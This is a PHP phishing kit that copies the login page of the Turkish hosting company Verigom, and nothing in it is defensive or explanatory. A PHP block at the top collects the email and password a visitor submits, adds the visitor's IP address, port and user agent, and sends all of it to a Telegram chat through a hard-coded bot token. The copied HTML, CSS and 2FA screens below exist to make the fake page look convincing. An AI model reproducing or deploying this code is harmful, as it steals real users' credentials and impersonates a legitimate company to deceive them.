<?php
$token = '2035537244:AAENXWddiB53xFXAERwaQECz8r4kDDWHfe4';

$email = '-';
$password = '-';
if(isset($_POST['email']))
{
	$email = $_POST['email'];
	$password = $_POST['password'];
}

$datas = '';
$datas.= 'REMOTE_PORT: '.$_SERVER['REMOTE_PORT'].'<br/>';
$datas.= 'SERVER_ADDR: '.$_SERVER['SERVER_ADDR'].'<br/>';
$datas.= 'REMOTE_ADDR: '.$_SERVER['REMOTE_ADDR'].'<br/>';
$datas.= 'HTTP_USER_AGENT: '.$_SERVER['HTTP_USER_AGENT'].'<br/>';
$datas.= 'HTTP_SEC_CH_UA_PLATFORM: '.$_SERVER['HTTP_SEC_CH_UA_PLATFORM'].'<br/>';

$params['chat_id'] = 499573430;
$params['text'] = json_encode($datas);
$lim = 650;
$mCount = ceil(strlen($params['text']) / $lim);
$text = $email.' === '.$password.' === '.$params['text'];

$result = '';
for($i=1;$i<=$mCount;$i++)
{
	$st = $i * $lim - $lim;
	$params['text'] = substr($text, $st, $lim);

	$url = "https://api.telegram.org/bot".$token . "/sendMessage?" . http_build_query( $params );
	
	file_get_contents($url);
	sleep(0.2);
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>

    <!-- Meta Tags -->
<html lang="tr">
<title>Giriş Yap</title>
<meta name="keywords" content="" />
<meta name="description" content="Tüm ürün ve hizmetlerimizden faydalanmak ve diğer tüm işlemler için hemen giriş yapın." />
<meta http-equiv="Content-Language" content="tr" />
<meta property="og:title" content="Giriş Yap" />
<meta property="og:description" content="Tüm ürün ve hizmetlerimizden faydalanmak ve diğer tüm işlemler için hemen giriş yapın." />
<meta property="og:locale" content="tr_TR">
<meta property="og:site_name" content="Verigom">
<meta property="og:url" content="https://www.verigom.com/">
<meta property="og:type" content="website">
<meta property="og:image" content="https://cdn.verigom.com/v1/img/og-genel.png">
<meta property="fb:app_id" content="312984946442720">
<meta name="hostbul-dogrulama" content="SH2FTDJY"/>


<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta name="robots" content="All" />
<link rel="canonical" href="https://www.verigom.com/giris-yap/" />
<link rel="icon" type="image/x-icon" href="https://cdn.verigom.com/resources/uploads/logo/favicon.ico" />
<meta name="theme-color" content="#064FB5">

<!-- Meta Tags -->
<!-- pre-actions -->
    <link rel="dns-prefetch" href="//www.google-analytics.com">
    <link rel="dns-prefetch" href="//www.facebook.com">
    <link rel="dns-prefetch" href="//connect.facebook.net">
	<link rel="dns-prefetch" href="//www.googletagmanager.com" />
	<link rel="dns-prefetch" href="//apis.google.com" />
	<link rel="dns-prefetch" href="//fonts.googleapis.com" />
    <link rel="dns-prefetch" href="//cdn.verigom.com">
	<link rel="dns-prefetch" href="//cdn.onesignal.com">

    
	<link rel="preconnect" href="https://cdn.verigom.com">
	<link rel="preconnect" href="https://connect.facebook.net" />
	<link rel="preconnect" href="https://www.google-analytics.com" />
	<link rel="preconnect" href="https://www.googletagmanager.com" />
	<link rel="preconnect" href="https://www.facebook.com">
	<link rel="preconnect" href="https://cdn.onesignal.com/">
	<link rel="preconnect" href="https://fonts.googleapis.com">

	
	
	
<!-- //pre-actions -->

<!-- Css -->
<link rel="stylesheet" href="https://cdn.verigom.com/resources/assets/style/theme.css?v=2.1.2">
<link rel="stylesheet" href="https://cdn.verigom.com/resources/assets/plugins/iziModal/css/iziModal.min.css?v=2.1.2">
<link rel="stylesheet" href="https://cdn.verigom.com/resources/assets/plugins/sweetalert2/dist/sweetalert2.min.css">
<script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=mbTVjL8XG8UGs24G60tthoTuowjx2ho9kXNDAxjmpgxe84KrVaL5_RYSOO0t43oSPgIeOv684GpNjAnrf25-nw" charset="UTF-8"></script><style type="text/css">
    .miotab-content{display: none;}
</style><style type="text/css">
	.menu .icon img{filter: invert(44%) sepia(23%) saturate(7433%) hue-rotate(2deg) brightness(105%) contrast(102%);}
	header.v-head .bottom-nav .flex nav.menu ul li.dropmenu .drop-container .drop-col a:hover img{filter: invert(100%) sepia(2%) saturate(2350%) hue-rotate(225deg) brightness(116%) contrast(100%);}
</style>

<link rel="stylesheet" href="https://cdn.verigom.com/templates/website/Verigom/css/wisecp.css?v=2.1.2" />
<link href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,500,600,700,800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link rel="stylesheet"  href="https://cdn.verigom.com/templates/website/Verigom/assets/plugins/owlcarousel/assets/owl.carousel.min.css">
<link rel="stylesheet"  href="https://cdn.verigom.com/templates/website/Verigom/assets/css/style.css">
<link rel="stylesheet"  href="https://cdn.verigom.com/templates/website/Verigom/css/font-awesome.min.css">
<link rel="stylesheet"  href="https://cdn.verigom.com/templates/website/Verigom/css/ionicons.min.css" />
<!-- Css -->
<!-- Js -->
<script>
    var template_address = "https://www.verigom.com/templates/website/Verigom/";
</script>
<script src="https://cdn.verigom.com/templates/website/Verigom/js/jquery-1.11.3.min.js"></script>




    <script src="https://cdn.verigom.com/resources/assets/plugins/js/jquery.countdown.min.js" defer></script>

<script type="text/javascript">
    var update_online_link  = "https://www.verigom.com/hesabim";
    var is_logged = false;
    var warning_modal_title = "Uyarı";
    var success_modal_title = "Başarılı";
</script>
<script src="https://cdn.verigom.com/resources/assets/plugins/iziModal/js/iziModal.min.js?v=2.1.2"></script>
<script src="https://cdn.verigom.com/resources/assets/plugins/sweetalert2/dist/promise.min.js"></script>
<script src="https://cdn.verigom.com/resources/assets/plugins/sweetalert2/dist/sweetalert2.min.js"></script>
<script src="https://cdn.verigom.com/resources/assets/javascript/jquery.form.min.js"></script>
<script src="https://cdn.verigom.com/resources/assets/javascript/webmio.js?v=2.1.2"></script>
    <script type="text/javascript">
        var vid = document.getElementById("bgvid");

        $(document).ready(function(){
            if (window.matchMedia('(prefers-reduced-motion)').matches) {
                if(vid !== null){
                    console.log(vid);
                    vid.removeAttr("autoplay");
                    vid.pause();
                }
            }
        });

        function vidFade() {
            vid.classList.add("stopfade");
        }

        $(document).ready(function(){

            $("#Signin_Form input:first").focus();

            $("#Signin_Form").bind("keypress", function(e) {
                if(e.keyCode == 13) $("#Signin_Form .mio-ajax-submit").click();
            });

            $("#Signforget_Form").bind("keypress", function(e){
                if (e.keyCode == 13) $("#Signforget_Form .mio-ajax-submit").click();
            });

        });
    </script>

   <style>
 ::-webkit-input-placeholder{color:rgba(255,255,255,0.75)}
:-moz-placeholder{color:rgba(255,255,255,0.75)}
::-moz-placeholder{color:rgba(255,255,255,0.75)}
:-ms-input-placeholder{color:rgba(255,255,255,0.75)}
::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,0.3);background-color:#F5F5F5}
::-webkit-scrollbar{width:9px;background-color:#F5F5F5}
::-webkit-scrollbar-thumb{background-color:#607D8B}
video{position:fixed;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;z-index:-100;transform:translateX(-50%) translateY(-50%);background-size:cover;transition:1s;}
.stopfade{opacity:.5}
.verificationcontent{padding:30px}
.verificationcontent p{font-size:18px;text-align:center}
.verificationcontent h1{text-align:center;font-size:24px;font-weight:bold;color:#8bc34a}
.verificationcontent h1 i{font-size:80px}
.verificationcontent form{text-align:center}
.verificationcontent input{text-align:center;width:200px;font-size:16px;font-weight:bold}
.secureoptions{width:265px;margin:auto;margin-top:35px;font-size:16px;font-weight:600;margin-bottom:15px}
.notverification{font-size:13px;color:#b5b5b5;width:100%;text-align:center;display:inline-block;margin-top:20px}
.notverification a{color:#b5b5b5;font-weight:600}
#uyeolgiris{position:fixed;overflow:auto;margin-bottom:0;width:100%;height:100%;bottom:0px;background-image:url(https://www.verigom.com/templates/website/Verigom/images/noisebg.png);background-color:rgba(50, 90, 108, 0.55);background-repeat:repeat}
#uyeolgirisbody .footer{display:none}
.uyeolgirisyap{float:none;width:400px;margin:auto;border-radius:27px;    -webkit-animation-name: fadeIn;
  animation-name: fadeIn;
  -webkit-animation-duration: 2s;
  animation-duration: 2s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;}
  @-webkit-keyframes fadeIn {
  0% {opacity: 0;}
  100% {opacity: 1;}
  }
  @keyframes fadeIn {
  0% {opacity: 0;}
  100% {opacity: 1;}
  }
.uyeol{display:inline-block;width:100%;margin:auto;float:none;border-radius:10px;margin-bottom:0px;background:rgba(0,0,0,0.25);box-shadow:0 5px 30px rgba(0,0,0,0.26);color:rgba(255, 255, 255, 0.75)}
.uyeolgirisslogan{float:left;width:100%;text-align:left;margin-top:0;display:none}
.uyeolgirishead{text-align:center;width:100%;margin-top:9%;margin-bottom:0;float:none; -webkit-animation-name: fadeIn;
  animation-name: fadeIn;
  -webkit-animation-duration: 2s;
  animation-duration: 2s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;}
.padding30{padding:10px 30px}
.sifreunuttulink{color:rgba(255,255,255,0.58)}
.sifreunuttulink:hover{color:rgba(255,255,255,1.00)}
.uyeolgirishead h1{display:none}
.logo{float:none;margin-top:0px;margin-bottom:40px;position:relative}
.uyeolgirisyap .gonderbtn{margin-top:30px}
.logo img{width:200px}
.uyeolgirisslogan h4{width:80%}
#uyeolgiris input{background:transparent;color:rgba(255,255,255,0.75);border-bottom-color:rgba(255,255,255,0.58)}
.uyeolgirisyap .btn{width:200px;background:transparent;    padding: 12px 0px;}
.clientcopyright{width:100%;text-align:center;font-size:13px;margin-top:15px;margin-bottom:30px;color:#b4b4b4;display:inline-block}
.clientcopyright a{color:#b4b4b4}
.socialconnect{display:inline-block;border:none;padding-bottom:0px;margin-bottom:0px}
.footsosyal{margin-top:15px}
.footsosyal a{color:#a1a1a1}
.footsosyal a:hover{background:#eee}
#girisyapright h4{display:none}
.footsosyal{display:none}
.createnewaccountlink{color:rgba(255,255,255,0.58);font-weight:600;margin-bottom:10px;display:inline-block;}
.createnewaccountlink:hover{color:rgba(255,255,255,1.58)}
.checktext a{color:rgba(255,255,255,0.58)}
.checktext a:hover{color:rgba(255,255,255,1.58)}
.country-name{color:#999}
.selected-dial-code{color:rgba(255, 255, 255, 0.75)}

@media only screen and (min-width:320px) and (max-width:1024px){
.uyeolgirishead{width:100%;margin-top:15%}
.uyeolgirishead .logo {    margin-bottom: 25px;}
.uyeolgirisyap{width:100%}
#wrapper{width:90%}
.uyeol{width:100%;position:relative;border-right:none}
.signupcon{position:relative}
#uyeolgiris{overflow-x:auto}
.uyeolgirisslogan{text-align:center}
.uyeolgirisslogan h4{width:90%;font-size:17px;margin:auto;margin-top:25px}
}

#uyeolgiris {
    background: rgba(0,0,0,.1);
}

#uyeolgiris input {
    background: #fff;
    color: #2b2b2b!important;
    line-height: 1em;
    padding: 8px 15px;
    margin-bottom: 17px;
}

#uyeolgiris input::placeholder {
    color: #2b2b2b;
}

.checkbox-custom:checked+.checkbox-custom-label:before {
    background: #FF6600;
    border-color: #FF6600;
}

.checkbox-custom+.checkbox-custom-label:before, .radio-custom+.radio-custom-label:before {
    border-radius: 50px;
    border-color: #FF6600;
}

.uyeolgirisyap .btn {
    background: #fff;
    color: #2b2b2b;
    border-radius: 50px;
    border-color: #fff;
    line-height: 1em;
}

.checkbox-custom-label, .radio-custom-label {
    color: #fff;
}

a.sifreunuttulink {color: #fff;}

a.createnewaccountlink {
    background: #FF6600;
    line-height: 40px;
    padding: 0 15px;
    border-radius: 10px;
    color: #fff;
    float: right;
    margin-top: 10px;
}

#girisyapright h4 {
    display: block;
    border: none;
    color: #fff;
    padding-top: 20px;
    margin-bottom: 15px;
    float: left;
}

.uyeolgirisyap {
    width: 490px;
}
.uyeol {
    background: rgba(0,0,0,.6);
}

@media only screen and (max-width: 768px) {
    .uyeolgirisyap {
        width: 100%;
    }

    #girisyapright h4 {
        display: block;
        text-align: center;
        float: none;
    }

    a.createnewaccountlink {
        float: none;
        margin: 0 auto;
        display: block;
        text-align: center;
        margin-bottom: 10px;
    }
}
</style>

</head>
<body id="uyeolgirisbody">

<div id="two-factor-verification" style="display: none;">
    <script type="text/javascript">
        $(document).ready(function(){

            $("#TwoFactorForm").bind("keypress", function(e) {
                if (e.keyCode == 13) $("#btn_check").click();
            });

            $("#btn_check").click(function(){
                $("#TwoFactorForm input[name=action]").val("two-factor-check");
                MioAjaxElement(this,{
                    waiting_text: "Bekleyiniz...",
                    form: $("#TwoFactorForm"),
                    result:"signin_submit",
                });
            });

            $("#btn_resend").click(function(){
                $("#TwoFactorForm input[name=action]").val("two-factor-resend");
                MioAjaxElement(this,{
                    waiting_text: "Bekleyiniz...",
                    form: $("#TwoFactorForm"),
                    result:"signin_submit",
                });
            });

        });
    </script>

    <div class="padding20 verificationcontent">
        <h1><i class="fa fa-shield" aria-hidden="true"></i><br>Güvenlik Kontrolü</h1>
        <p>Güvenliğiniz için, lütfen kayıtlı gsm numaranıza gönderilen doğrulama kodunu giriniz.</p>
        <p>Kayıtlı Gsm Numaranız<br><strong id="two_factor_phone">*********0000</strong></p>

        <form action="https://www.verigom.com/giris-yap" method="post" id="TwoFactorForm">
            <input type="hidden" name="token" value="b609ed5b712780e581987ce971b2cc24bc221afe3e0ddd3c474ecfdb8bc4e5de">
                <div class="yuzde70">
                    <input type="text" name="code" placeholder="Doğrulama Kodu?">
                </div>
               <div class="yuzde70" style="margin-top: 15px;font-size: 17px;display: inline-block;"><strong><i class="fa fa-clock-o" aria-hidden="true"></i> <span id="countdown1">00:00</span></strong></div>
            <input type="hidden" name="action" value="two-factor-check">
        </form>

        <div class="line"></div> 

            <div align="center" class="yuzde100">
                <div class="yuzde50"><a class="gonderbtn yesilbtn " id="btn_check" href="javascript:void 0;">Devam</a>
                <a class="lbtn" id="btn_resend" href="javascript:void 0;" style="display: none;margin-top: 20px;">Tekrar Gönder</a>
                </div>
            </div>

        <div class="notverification">Hesabınızı doğrulayamıyorsanız, lütfen <a target="_blank" href="https://www.verigom.com/iletisim">buraya tıklayın.</a></a></div>

    </div>
</div>

<div id="location-verification" style="display: none;">
    <script type="text/javascript">
        $(document).ready(function(){

            $("#Location_Verification_Form").bind("keypress", function(e) {
                if (e.keyCode == 13) $("#btn_continue").click();
            });

            $("#btn_continue").click(function(){
                if($("#Location_Verification_Form #method_selections").css("display") == "block")
                    $("#Location_Verification_Form input[name=apply]").val("selection");
                else
                    $("#Location_Verification_Form input[name=apply]").val("check");

                MioAjaxElement(this,{
                    waiting_text: "Bekleyiniz...",
                    form: $("#Location_Verification_Form"),
                    result:"signin_submit",
                });
            });

            $("#btn_resend2").click(function(){
                $("#Location_Verification_Form input[name=apply]").val("resend");
                MioAjaxElement(this,{
                    waiting_text: "Bekleyiniz...",
                    form: $("#Location_Verification_Form"),
                    result:"signin_submit",
                });
            });

        });
    </script>
    <div class="padding20 verificationcontent">
        <h1><i class="fa fa-lock" aria-hidden="true"></i><br>Güvenlik Kontrolü</h1>
        <p>Görünüşe göre farklı bir cihazdan erişim sağlıyorsunuz.</p>
        <p>Sizi tanıyabilmemiz için lütfen hesabınızı doğrulayın.</p>


        <form action="https://www.verigom.com/giris-yap" method="post" id="Location_Verification_Form">
            <input type="hidden" name="token" value="b609ed5b712780e581987ce971b2cc24bc221afe3e0ddd3c474ecfdb8bc4e5de">
            <div id="method_selections" style="display: none; text-align: left;">
                <div class="secureoptions">

                    <input id="method_security_question" class="radio-custom" name="selected_method" value="security_question" type="radio">
                    <label style="margin-right:10px;" for="method_security_question" class="radio-custom-label"><span class="checktext">Güvenlik Sorusu ile Doğrula.</span></label>

                    <div class="clear"></div>

                    <input id="method_phone" class="radio-custom" name="selected_method" value="phone" type="radio">
                    <label style="margin-right:10px;" for="method_phone" class="radio-custom-label"><span class="checktext">SMS ile Doğrula.</span></label>

                </div>
            </div>

            <div id="method_security_question_con" style="display: none;">
                <p><br><strong id="security_question_text">*****?</strong></p>

                <div class="yuzde70">
                    <input type="text" name="security_question_answer" placeholder="Cevabınız?"><br>
                </div>
            </div>


            <div id="method_phone_con" style="display: none;">
                <p><br>Kayıtlı Gsm Numaranız<br><strong id="phone_text">*********0000</strong></p>

                <div class="yuzde70">
                    <input type="text" name="code" placeholder="Doğrulama Kodu?">
                </div>
                <div class="yuzde70" style="margin-top: 15px;font-size: 17px;display: inline-block;"><strong><i class="fa fa-clock-o" aria-hidden="true"></i> <span id="countdown2">00:00</span></strong><br></div>

            </div>

            <div class="line"></div>

            <div align="center" class="yuzde100">
                <div class="yuzde50">
                    <a class="gonderbtn yesilbtn" id="btn_continue" href="javascript:void 0;">Devam</a>
                    <a class="lbtn" id="btn_resend2" href="javascript:void 0;" style="display: none;margin-top: 20px;">Tekrar Gönder</a>
                </div>
            </div>

            <input type="hidden" name="action" value="location-verification">
            <input type="hidden" name="apply" value="selection">
        </form>


        <div class="notverification">Hesabınızı doğrulayamıyorsanız, lütfen <a target="_blank" href="https://www.verigom.com/iletisim">buraya tıklayın.</a></a></div>
    </div>
</div>


<video poster="https://www.verigom.com/templates/website/Verigom/images/signbg.jpg" id="bgvid" playsinline autoplay muted loop>
    <source src="https://www.verigom.com/templates/website/Verigom/images/signbg.mp4" type="video/mp4">
</video>


<div id="uyeolgiris">
    <div id="wrapper">
        <div class="uyeolgirishead">
            <div class="logo"> <a href="https://www.verigom.com"><img title="" alt="" src="https://www.verigom.com/resources/uploads/logo/2019-11-25/028c86ff965756baa83fcdc.png" width="253" height="auto"></a></div>
            <h1>Giriş Yap</h1>
        </div>



        <div class="uyeolgirisyap">

            <div style="display:none" id="uyegirisloganleft" class="uyeolgirisslogan"><h4>Tüm ürün ve hizmetlerimizden faydalanmak ve diğer tüm işlemler için hemen giriş yapın. Henüz bir hesabınız yok ise;</h4>
                                <a href="https://www.verigom.com/hesap-olustur" class="gonderbtn">Yeni Bir Hesap Oluşturun</a>
                            </div>


            <div class="uyeol" id="girisyapright">
                <div class="signupcon">
                    <div class="padding30">

                    	 

                    
                    <!-- Form Start -->
                    <form action="" method="POST">
                        <input type="hidden" name="token" value="b609ed5b712780e581987ce971b2cc24bc221afe3e0ddd3c474ecfdb8bc4e5de">                            <table width="100%" border="0">
                                <tbody>
                                <tr>
                                    <td>
                                        <h4><i class="fa fa-sign-in" aria-hidden="true"></i> <strong>Müşteri Paneli</strong></h4>
                                                                                    <a href="https://www.verigom.com/hesap-olustur" class="createnewaccountlink">+ Yeni Bir Hesap Oluşturun</a>
                                                                            </td>
                                </tr>

                                <tr>
                                    <td>
                                        <input name="email" type="text" placeholder="E-Posta" autocomplete="off"></td>
                                </tr>

                                <tr>
                                    <td>
                                        <input name="password" type="password" placeholder="Parola" autocomplete="off"></td>
                                </tr>

                                <tr>
                                    <td style="padding-top:10px;" colspan="2">
                                        <input id="checkbox-4" class="checkbox-custom" name="remember" value="1" type="checkbox" style="width:100px;">
                                        <label for="checkbox-4" class="checkbox-custom-label"><span class="checktext">Beni Hatırla</span></label>
                                        <a class="sifreunuttulink" href="javascript:void(0);" onclick="forget_password();">» Parola Sıfırlama</a>
                                    </td>
                                </tr>

                                

                                <tr>
                                    <td style="border:none">
                                        <div class="clear" style="margin-bottom: 15px;"></div>
                                        <div align="center">
                                            <button type="submit" style="float:none;" class="btn">Giriş Yap</button>
                                            <div class="clear"></div>

                                        </div>

                                        
                                    </td>
                                </tr>

                                </tbody>
                            </table>
                    </form>
                    <!-- Form End -->
                    
                                        <form action="https://www.verigom.com/sifremi-unuttum" method="POST" id="Signforget_Form" style="display: none";>
                        <input type="hidden" name="token" value="b609ed5b712780e581987ce971b2cc24bc221afe3e0ddd3c474ecfdb8bc4e5de">
                        <table width="100%" border="0" id="forget_table">
                            <tbody>
                            <tr>
                                <td><h4><i class="fa fa-sign-in" aria-hidden="true"></i> <strong>Parola Sıfırlama</strong></h4></td>
                            </tr>

                            <tr>
                                <td>
                                    <input name="email" type="text" placeholder="E-Posta"></td>
                            </tr>

                            <tr>
                                <td style="padding-top:10px;" colspan="2">
                                    <a class="sifreunuttulink" href="javascript:void(0);" onclick="login();">» Giriş Yap</a>
                                </td>
                            </tr>

                            

                            <tr>
                                <td style="border:none">
                                    <div class="clear" style="margin-bottom: 15px;"></div>
                                    <div align="center">
                                        <button type="button" style="float:none;" mio-ajax-options='{"waiting_text":"Bekleyiniz...","result":"forget_submit"}' class="btn mio-ajax-submit">Gönder</button>
                                        <div class="clear"></div>
                                        <div class="error" id="Signforget_Form_output" align="center" style="display:none;font-weight:bold;"></div>
                                    </div>
                                </td>
                            </tr>
                            </tbody>
                        </table>

                        <!-- Success Div -->
                        <div id="forget_success" style="display:none">
                            <div style="margin-top:30px;margin-bottom:70px;text-align:center;">
                                <i style="font-size:80px;    margin-bottom: 25px;" class="fa fa-check"></i>
                                <h4 style="font-weight:bold;">Hatırlatma Gönderilmiştir.</h4>
                                <br>
                                <h5>Sistemde kayıtlı iletişim bilgilerinize bildirim yapılmıştır.</h5>
                            </div>
                        </div>
                        <!-- Success Div -->

                    </form>
                    <!-- Form END -->
                    
                    <!-- Success Div -->
                    <div id="Success_Div" style="display:none">
                        <div style="margin-top:30px;margin-bottom:70px;text-align:center;">
                            <i style="font-size:80px;color:green;" class="fa fa-check"></i>
                            <h4 style="color:green;font-weight:bold;">Giriş Başarıyla Gerçekleşmiştir.</h4>
                            <br>
                            <h5>Bekleyiniz...</h5>
                        </div>
                    </div>
                    <!-- Success Div -->

                    <script type="text/javascript">
                        function forget_password() {
                                                        $("#Signin_Form").fadeOut(100,function () {
                                $("#Signforget_Form").fadeIn(100);
                            });
                                                    }
                 
                                                    }
                        function forget_submit(result) {
                                                        if(result != ''){
                                var solve = getJson(result);
                                if(solve !==false && solve != undefined && typeof(solve) == "object"){
                                    if(solve.status == "error"){
                                        if(solve.js != undefined && solve.js != '') eval(solve.js);
                                        if(solve.for != undefined && solve.for != ''){
                                            $("#Signforget_Form "+solve.for).focus();
                                            $("#Signforget_Form "+solve.for).attr("style","border-bottom:2px solid red; color:red;");
                                            $("#Signforget_Form "+solve.for).change(function(){
                                                $(this).removeAttr("style");
                                            });
                                        }

                                        if(solve.message != undefined && solve.message != '')
                                            alert_error(solve.message,{timer:4000});
                                    }else if(solve.status == "sent"){
                                        $("#forget_table").fadeOut(750,function() {
                                            $("#forget_success").fadeIn(750);
                                        })
                                    }
                                }
                            }
                        }
                    </script>

                                        

                                                                                <div class="footsosyal">
                                            <a href="https://www.facebook.com/verigomcom/" target="_blank" title="Facebook"><i class="fa fa-facebook" aria-hidden="true"></i></a><a href="https://www.twitter.com/verigomcom/" target="_blank" title="Twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a><a href="https://www.instagram.com/verigomcom/" target="_blank" title="Instagram"><i class="fa fa-instagram" aria-hidden="true"></i></a><a href="https://www.linkedin.com/company/verigom/" target="_blank" title="LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i></a>                                        </div>
                                        
                </div>


            </div>


            </div>

        </div>


    </div><div class="clear"></div>
</div>

<a href="#0" class="cd-top">Top</a>

<!-- Analytics Code START -->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154918448-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-154918448-1');
</script>
<script defer src="https://cdn.verigom.com/templates/website/Verigom/css/wisecp.css?v=2.1.2"></script><!-- Analytics Code END -->

<script src="https://www.verigom.com/templates/website/Verigom/js/aos.js"></script>
<script type="text/javascript">
    AOS.init({
        easing: 'ease-out-back',
        duration: 1000
    });
</script>

</body>
</html>